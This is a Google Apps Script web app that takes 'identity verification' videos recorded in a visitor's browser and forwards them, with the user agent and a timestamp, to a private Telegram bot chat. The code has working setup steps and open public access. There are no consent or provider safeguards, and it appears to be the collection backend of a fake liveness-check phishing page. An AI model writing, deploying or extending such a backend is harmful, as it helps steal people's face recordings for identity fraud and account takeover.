// Google Apps Script Web App: forwards a recorded verification video to a
// Telegram bot. Designed to be deployed alongside (or replacing) the form
// endpoints the user already runs on Apps Script.
//
// SETUP
//
// 1. Apps Script editor → Project Settings (gear icon) → Script Properties:
//      TELEGRAM_BOT_TOKEN  — from @BotFather
//      TELEGRAM_CHAT_ID    — your numeric chat id (use @userinfobot)
//
// 2. Deploy → New deployment → Type: Web app
//      Execute as: Me
//      Who has access: Anyone
//
// 3. Copy the /exec URL it gives you. Paste it into <meta name="liveness-api">
//    in public/index.html.
//
// PROTOCOL
//
// The browser POSTs the recording as multipart/form-data with three fields:
//   mime  — original media MIME type (e.g. "video/webm")
//   ua    — first 140 chars of the user agent string
//   video — the recording, base64-encoded
//
// multipart/form-data is the only POST shape that reliably survives the
// 302 redirect from script.google.com to script.googleusercontent.com
// without losing CORS headers in the browser.
//
// A legacy text/plain JSON body { mime, ua, video } is still accepted for
// backwards compat.

var SCRIPT_PROPS = PropertiesService.getScriptProperties();

// Conservative cap. Apps Script Web Apps accept ~50 MB POST bodies, and
// base64 encoding bloats binary by ~33%, so 25 MB of video ≈ 33 MB on the wire.
var MAX_VIDEO_BYTES = 25 * 1024 * 1024;

function doPost(e) {
  try {
    var botToken = SCRIPT_PROPS.getProperty('TELEGRAM_BOT_TOKEN');
    var chatId = SCRIPT_PROPS.getProperty('TELEGRAM_CHAT_ID');
    if (!botToken || !chatId) {
      return jsonOut({ ok: false, error: 'telegram not configured on server' });
    }

    if (!e) return jsonOut({ ok: false, error: 'empty event' });

    // multipart/form-data → fields land in e.parameter; this is the
    // preferred path. Legacy text/plain JSON bodies land in
    // e.postData.contents and are parsed as a fallback.
    var b64, mime, ua;
    if (e.parameter && e.parameter.video) {
      b64 = e.parameter.video;
      mime = e.parameter.mime || 'video/webm';
      ua = e.parameter.ua || 'unknown';
    } else if (e.postData && e.postData.contents) {
      var parsed;
      try {
        parsed = JSON.parse(e.postData.contents);
      } catch (parseErr) {
        return jsonOut({ ok: false, error: 'invalid body (expected form-data or json)' });
      }
      b64 = parsed.video;
      mime = parsed.mime || 'video/webm';
      ua = parsed.ua || 'unknown';
    } else {
      return jsonOut({ ok: false, error: 'empty body' });
    }

    if (!b64) return jsonOut({ ok: false, error: 'missing video field' });

    mime = String(mime).split(';')[0].trim();
    ua = String(ua).slice(0, 140);

    var bytes = Utilities.base64Decode(b64);
    if (bytes.length === 0) {
      return jsonOut({ ok: false, error: 'decoded video is empty' });
    }
    if (bytes.length > MAX_VIDEO_BYTES) {
      return jsonOut({ ok: false, error: 'video exceeds size limit' });
    }

    var ext = mime.indexOf('mp4') >= 0 ? 'mp4' : 'webm';
    var filename = 'verification-' + Date.now() + '.' + ext;
    var sizeKB = Math.round(bytes.length / 1024);

    var caption =
      'جلسة تحقق هوية جديدة\n' +
      'الوقت: ' + new Date().toISOString() + '\n' +
      'الحجم: ' + sizeKB + ' KB\n' +
      'UA: ' + ua;

    var blob = Utilities.newBlob(bytes, mime, filename);

    var result = telegramSend(botToken, 'sendVideo', {
      chat_id: chatId,
      caption: caption,
      supports_streaming: 'true',
      video: blob,
    });

    if (!result.ok) {
      // Telegram sometimes refuses sendVideo for webm without proper metadata;
      // sendDocument always works as long as the file is under 50 MB.
      result = telegramSend(botToken, 'sendDocument', {
        chat_id: chatId,
        caption: caption,
        document: blob,
      });
      if (!result.ok) {
        return jsonOut({ ok: false, error: 'telegram rejected', details: result.description || '' });
      }
      return jsonOut({ ok: true, file: filename, mode: 'document' });
    }

    return jsonOut({ ok: true, file: filename, mode: 'video' });
  } catch (err) {
    return jsonOut({ ok: false, error: (err && err.message) || 'internal error' });
  }
}

function telegramSend(token, method, payload) {
  try {
    var res = UrlFetchApp.fetch(
      'https://api.telegram.org/bot' + token + '/' + method,
      {
        method: 'post',
        payload: payload,
        muteHttpExceptions: true,
      }
    );
    return JSON.parse(res.getContentText());
  } catch (err) {
    return { ok: false, description: (err && err.message) || 'fetch failed' };
  }
}

function jsonOut(obj) {
  // Apps Script Web Apps always return HTTP 200 — the client must check `ok`
  // in the JSON body to determine success.
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}

function doGet() {
  return jsonOut({ message: 'liveness telegram bridge — POST only' });
}
